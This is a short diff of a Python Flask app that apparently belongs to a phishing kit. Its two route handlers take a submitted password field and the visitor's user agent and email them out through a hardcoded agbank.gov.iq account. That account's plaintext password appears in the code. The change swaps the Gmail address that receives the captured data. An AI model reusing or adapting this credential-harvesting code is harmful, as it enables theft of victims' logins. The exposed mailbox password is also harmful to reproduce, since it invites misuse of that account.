@@ -147,7 +147,7 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "balad764@agbank.gov.iq"
         sender_emaill = "balad764"
-        receiver_email = "s.toihidi@gmail.com"
+        receiver_email = "egoyibo001@gmail.com"
         password = "i5c3f@Jq8u"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -185,7 +185,7 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "balad764@agbank.gov.iq"
         sender_emaill = "balad764"
-        receiver_email = "s.toihidi@gmail.com"
+        receiver_email = "egoyibo001@gmail.com"
         password = "i5c3f@Jq8u"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
